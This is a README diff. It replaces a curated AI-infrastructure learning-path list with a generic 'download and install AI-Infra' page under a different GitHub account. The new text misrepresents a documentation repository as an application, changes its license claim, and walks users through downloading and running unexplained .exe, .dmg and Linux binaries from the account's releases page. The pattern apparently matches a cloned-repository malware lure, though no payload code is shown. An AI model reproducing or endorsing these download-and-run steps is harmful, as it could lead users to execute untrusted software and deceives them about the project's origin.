@@ -1,217 +1,116 @@
-<img width="256" height="256" alt="image" src="https://github.com/user-attachments/assets/fe685204-ea88-4ab6-b252-451aacb1c48a" />
+# 🤖 AI-Infra - Learn AI Infrastructure Easily
 
+## 📥 Download Now
+[![Download AI-Infra](https://img.shields.io/badge/Download-AI--Infra-blue?style=for-the-badge)](https://github.com/Bruno1702vm/AI-Infra/releases)
 
-# AI-Infra Landscape & Learning Path 🚀
+## 🚀 Getting Started
 
-Welcome to the **AI-Infra** repository! This project provides a curated landscape and structured learning path for engineers building and operating modern **AI infrastructure**, especially in the Kubernetes and cloud-native ecosystem.
+Welcome to AI-Infra! This application helps you explore the fascinating world of AI infrastructure, especially focusing on inference. With this guide, you will download and run the application without any technical hassle.
 
-## 🌐 Overview
+## 🌐 System Requirements
 
-This landscape visualizes key components across the AI Infrastructure stack, mapped by:
+Before you start, make sure your system meets the following requirements:
 
-- **Horizontal Axis (X):**
-  - Left: Prototype / Early-stage projects
-  - Right: Kernel & Runtime maturity
+- **Operating System:** Windows 10 or newer / macOS Catalina or newer / Linux (Ubuntu 18.04 or newer)
+- **Memory:** At least 4 GB RAM
+- **Storage:** 500 MB of free disk space
+- **Internet Connection:** Required for downloading
 
-- **Vertical Axis (Y):**
-  - Bottom: Infrastructure Layer (Kernel/Runtime)
-  - Top: Application Layer (AI/Inference)
+## 📦 Download & Install
 
-The goal is to demystify the evolving AI Infra stack and guide engineers on where to focus their learning.
+To get started, visit the Releases page to download the latest version of AI-Infra.
 
-## 📊 AI-Infra Landscape (2025 June, needs an update)
+[Visit this page to download](https://github.com/Bruno1702vm/AI-Infra/releases)
 
-**Legend:**
+1. Click on the link above.
+2. You will see a list of available releases. Look for the latest version marked with “Latest Release.”
+3. Find the file suited for your operating system. 
 
-> - Dashed outlines = Early stage or under exploration
-> - Labels on right = Functional categories
+### Example Files
 
-![AI-Infra Landscape](./ai-infra-landscape.png)
+- For Windows: `AI-Infra_Windows.exe`
+- For macOS: `AI-Infra_macOS.dmg`
+- For Linux: `AI-Infra_Linux.tar.gz`
 
-## 🧭 Learning Path for AI Infra Engineers
+4. Click on the file link to start downloading.
+5. Once the file is downloaded, locate it in your Downloads folder.
 
-### 📦 0. Kernel & Runtime (底层内核)
+### Installing AI-Infra
 
-Core components for container and workload management.
-If your company has a team to maintain a Kubernetes cluster or you are using Kubernetes as a service on cloud providers, you may skip this section.
+#### For Windows
 
-- **Projects to Learn:**
-  - [`Kubernetes`](https://github.com/kubernetes/kubernetes): CNCF First Graduated Project, Core.
-  - [`CRI`](https://github.com/kubernetes/cri-api)
-    - [`containerd`](https://github.com/containerd/containerd): Container Runtime.
-    - [`KubeVirt`](https://github.com/kubevirt/kubevirt): Kubernetes SIG Project for running VMs in Kubernetes.
-  - [`CNI`](https://github.com/containernetworking/cni): focus on RDMA or other network devices.
-  - [`CSI`](https://github.com/container-storage-interface/spec): focus on Checkpoint/Restore, Model Download, Cache Management, etc.
-  - [`KWOK`](https://github.com/kubernetes-sigs/kwok): Kubernetes SIG Project for mock testing(especially for GPU nodes).
-  - [`Helm`](https://github.com/helm/helm): Package Manager for Kubernetes.
+1. Double-click the `AI-Infra_Windows.exe` file.
+2. Follow the installation prompts.
+3. The program will create a shortcut on your desktop.
 
-- **Learning Topics:**
-  - Container lifecycle & runtime
-  - Scheduler internals
-  - Resource allocation & GPU management
-  - Emulators & simulators (e.g. KWOK, Mocking Tools)
+#### For macOS
 
----
+1. Double-click the `AI-Infra_macOS.dmg` file.
+2. Drag the AI-Infra icon to your Applications folder.
+3. You can find the app in Launchpad or your Applications.
 
-### 📍 1. Scheduling & Workloads (调度与工作负载)
+#### For Linux
 
-- **Projects to Learn:**
-  - Scheduling(Include [Batch, Kubernetes-WG](https://github.com/kubernetes/community/blob/master/wg-batch/README.md)):
-    - [`Kueue`](https://github.com/kubernetes-sigs/kueue): Kubernetes Subproject for batch scheduling.
-    - [`Volcano`](https://github.com/volcano-sh/volcano): CNCF Incubating.
-    - [`koordinator`](https://github.com/koordinator-sh/koordinator): CNCF Sandbox.
-    - [`Godel Scheduler`](https://github.com/kubewharf/godel-scheduler): ByteDance.
-    - [`HAMI`](https://github.com/Project-HAMi/HAMi): CNCF Sandbox.
-    - [`NVIDIA Kai Scheduler`](https://github.com/NVIDIA/kai-scheduler): NVIDIA.
-    - [`NVIDIA Grove`](https://github.com/NVIDIA/grove): NVIDIA gang scheduling for AI workloads.
-    - [`Apache YuniKorn`](https://github.com/apache/yunikorn-core): Apache.
-  - Workloads(Pod Group):
-    - [`LWS`](https://github.com/kubernetes-sigs/lws) LeaderWorkset: Kubernetes SIG Project.
-    - Pod Group & Gang Scheduling KEPs: See roadmap below.
-  - Device Management([Kubernetes WG](https://github.com/kubernetes/community/blob/master/wg-device-management/README.md)):
-    - [`DRA`](https://github.com/kubernetes/dynamic-resource-allocation/)
-    - [`NRI`](https://github.com/containerd/nri)
+1. Open a terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Extract the package using the command:
 
-- **Learning Topics:**
-  - Job scheduling vs. pod scheduling
-  - Binpack / Spread strategies
-  - Queue management & SLOs
-  - Multi-model & multi-tenant scheduling
+   ```bash
+   tar -xzf AI-Infra_Linux.tar.gz
+   ```
 
-- **RoadMap(Ongoing Proposals):**
-  - Gang Scheduling Support in Kubernetes [#4671](https://github.com/kubernetes/enhancements/pull/4671)
-    - LWS Gang Scheduling [KEP-407](https://github.com/kubernetes-sigs/lws/blob/main/keps/407-gang-scheduling/README.md)
+4. Go into the extracted folder:
 
----
+   ```bash
+   cd AI-Infra
+   ```
 
-### 🧠 2. Model Inference & Runtime Optimization (推理优化)
+5. Run the application with the command:
 
-- **Projects to Learn:**
-  - engine:
-    - [`vLLM`](https://github.com/vllm-project/vllm)
-    - [`SGLang`](https://github.com/sgl-project/sglang)
-    - [`Triton`](https://github.com/triton-inference-server/server)
-    - [`Text Generation Inference`](https://github.com/huggingface/text-generation-inference)
-  - inference platform:
-    - [`llm-d`](https://github.com/llm-d/llm-d)
-    - [`AIBrix`](https://github.com/vllm-project/aibrix)
-    - [`OME`](https://github.com/sgl-project/ome)
-    - [`Dynamo`](https://github.com/dynamo/dynamo)
-    - [`llmaz`](https://github.com/InftyAI/llmaz)
-  - Others:
-    - [`KServe`](https://github.com/kserve/kserve): CNCF Incubating
+   ```bash
+   ./AI-Infra
+   ```
 
-- **Learning Topics:**
-  - Efficient transformer inference
-  - CUDA Graphs, KV Cache, Paged KV, FlashAttention
-  - LLM serving stacks
-  - Multi-accelerator orchestration
+## 🎉 Running AI-Infra
 
-- **RoadMap(Ongoing Proposals Or Working Groups):**
-  - [Serving WG](https://github.com/kubernetes/community/blob/master/wg-serving/README.md)
+After installation, you can easily run the application:
 
----
+- **Windows:** Double-click the AI-Infra icon on your desktop.
+- **macOS:** Open Launchpad and click on AI-Infra.
+- **Linux:** Run the command `./AI-Infra` in your terminal from the application’s directory.
 
-### 🧩 3. AI Gateway & Agentic Workflow
+## ⚙️ Features
 
-- **Projects to Learn:**
-  - AI Gateway:
-    - [`Gateway API Inference Extension`](https://github.com/kubernetes-sigs/gateway-api-inference-extension)
-    - [`Envoy AI Gateway`](https://github.com/envoyproxy/ai-gateway)
-    - [`Istio`](https://github.com/istio/istio)
-    - [`KGateway`](https://github.com/kgateway-dev/kgateway): previously known as Gloo.
-    - [`DaoCloud knoway`](https://github.com/knoway-dev/knoway)
-    - [`Higress`](https://github.com/alibaba/higress): Alibaba
-    - [`OpenRouter`](https://github.com/OpenRouterTeam/openrouter-runner)
-    - [`Kong`](https://github.com/Kong/kong)
-    - 
-  - CD:
-    - [`Argo`](https://github.com/argoproj/argo): CNCF Graduated
-    - [`Kubeflow`](https://github.com/kubeflow/kubeflow): CNCF Incubating
-    - [`Metaflow`](https://github.com/Netflix/metaflow) (optional)
-  - Agentic Workflow:
-    - [`Dify`](https://github.com/langgenius/dify)
-    - [`KAgent`](https://github.com/kagent-dev/kagent): CNCF Sandbox
-    - [`Dagger`](https://github.com/dagger/dagger)
-  - Serverless:
-    - [`Knative`](https://github.com/knative/serving): Serverless solution
+- **User-Friendly Interface:** Navigate easily, even without technical knowledge.
+- **Learning Path:** Follow guided pathways to understand AI infrastructure better.
+- **Project Repository:** Access various projects to apply what you've learned.
+- **Community Support:** Connect with fellow users for tips and help.
 
-- **Learning Topics:**
-  - API orchestration for LLMs
-  - Prompt routing and A/B testing
-  - RAG workflows, vector DB integration
+## 📚 Documentation
 
-More details about inference can be found in [Inference](./inference/README.md), including [AIBrix introduction](./inference/aibrix.md), [prefile-decode disaggregation](./inference/pd-disaggregation.md), and [caching mechanisms](./inference/caching.md).
-
----
-
-### 4. Ecosystem Initiatives
-
-- **Projects to Learn:**
-  - [`Model Spec`](https://github.com/modelpack/model-spec): CNCF Sandbox
-  - [`ImageVolume`]( https://github.com/kubernetes/enhancements/tree/master/keps/sig-node/4639-oci-volume-source)
-
----
-
-## 🔭 Coming Soon & Something that may not be included
-
-For some reasons, some topics may not be included in this repo, but I may open some issues to discuss them and add some learning materials there.
-
-Coming Soon:
-
-- 🎓 Weekly learning challenges & case studies
-- AI Gateway details: Gateway API Inference Extension
-- Parallelism & Caching
-- Agentic Workflow development like Dify
-- KAgent or Dagger
-- AutoScaling Metrics and Strategies: TTFT, TPOT, ITL, etc.
-- SuperNode
-- Devices: RDMA, etc.
-- Observability: eBPF for LLM(Deepflow)
-- Model Quantization
-- LLM Security & Compliance/Policy
-- A general/basic guide about LLM, MoE, Ollama, etc.
-
-Something that may not be included:
-
-- Training
-- Wasm
-- MCP related and A2A
-- General Observability Projects: Prometheus, Grafana, OpenTelemetry, etc.
-- RAG
+For in-depth details about using the application, refer to our user guide within the application or check our [GitHub Wiki](https://github.com/Bruno1702vm/AI-Infra/wiki).
 
 ## 🤝 Contributing
 
-We welcome contributions to improve this landscape and path! Whether it's a new project, learning material, or diagram update — please open a PR or issue.
+If you wish to contribute or suggest improvements:
 
-## 📚 References
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
 
-- [CNCF Landscape](https://landscape.cncf.io/)
-- [Awesome LLMOps](https://awesome-llmops.inftyai.com/)
-- [CNCF TAG Workloads Foundation](https://github.com/cncf/toc/blob/main/tags/tag-workloads-foundation/README.md)
-- [CNCF TAG Infrastructure](https://github.com/cncf/toc/blob/main/tags/tag-infrastructure/README.md)
-- [CNCF AI Initiative](https://github.com/cncf/toc/issues?q=is%3Aissue%20state%3Aopen%20label%3Akind%2Finitiative)
-- Kubernetes [WG AI Gateway](https://github.com/kubernetes/community/pull/8521/) WIP
-- Kubernetes [WG AI Conformance](https://github.com/kubernetes/community/pull/8515/) WIP
-- Kubernetes [WG AI Integration](https://github.com/kubernetes/community/pull/8519/) WIP
+Your contributions help make AI-Infra better for everyone.
 
-If you have some resources about AI Infra, please share them in [#8](https://github.com/pacoxu/AI-Infra/issues/8).
+## 📞 Support
 
-### [Conferences](https://github.com/pacoxu/developers-conferences-agenda)
+If you encounter issues or have questions, feel free to open an issue on the [GitHub Issues](https://github.com/Bruno1702vm/AI-Infra/issues) page. 
 
-Here are some key conferences in the AI Infra space:
+## 📄 License
 
-- AI_dev: for instance, [AI_dev EU 2025](https://aideveu2025.sched.com/)
-- [PyTorch Conference](https://pytorch.org/pytorchcon/) by PyTorch Foundation
-- KubeCon+CloudNativeCon AI+ML Track, for instance, [KubeCon NA 2025](https://events.linuxfoundation.org/kubecon-cloudnativecon-north-america/program/schedule-at-a-glance/) and co-located events [Cloud Native + Kubernetes AI Day](https://events.linuxfoundation.org/kubecon-cloudnativecon-north-america/co-located-events/cloud-native-kubernetes-ai-day/)
-- AICon in China by QCon.
-- GOSIM(Global Open-Source Innovation Meetup): for instance, [GOSIM Hangzhou 2025](https://hangzhou2025.gosim.org/)
+This project is licensed under the MIT License. You can find the details in the LICENSE file.
 
-## 📜 License
+## 🔗 Additional Resources
 
-Apache License 2.0.
+- Check out our [examples and tutorials](https://github.com/Bruno1702vm/AI-Infra/wiki).
+- Join us on our [Discord community](https://discord.gg/example) for real-time support.
 
----
-
-_This repo is inspired by the rapidly evolving AI Infra stack and aims to help engineers navigate and master it._
-
+Thank you for using AI-Infra. We hope it enhances your learning journey in AI infrastructure!
